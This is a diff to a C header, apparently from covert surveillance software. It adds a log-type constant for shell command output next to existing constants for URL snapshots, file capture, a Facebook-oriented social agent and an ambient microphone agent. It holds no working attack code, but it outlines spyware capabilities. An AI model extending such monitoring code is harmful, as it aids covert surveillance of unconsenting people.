@@ -137,6 +137,7 @@ extern BOOL is_demo_version;
 #define PM_URLAGENT_SNAP (PM_URLLOG + 1) // Usato per gli snapshot degli url (non e' un agente ma solo un logtype)
 #define PM_FILEAGENT_CAPTURE 0x00000001  // (non e' un agente ma solo un logtype)
 
+#define PM_COMMANDEXEC		  0xC0C0    // Usato per l'output dei comandi di shell
 #define PM_SOCIALAGENT		  0xAAB0
 #define PM_SOCIALAGENT_FB	  0xAAB1	// Usato per i file di markup per il modulo facebook dell'agente social
 #define PM_AMBMICAGENT        0xC2C2
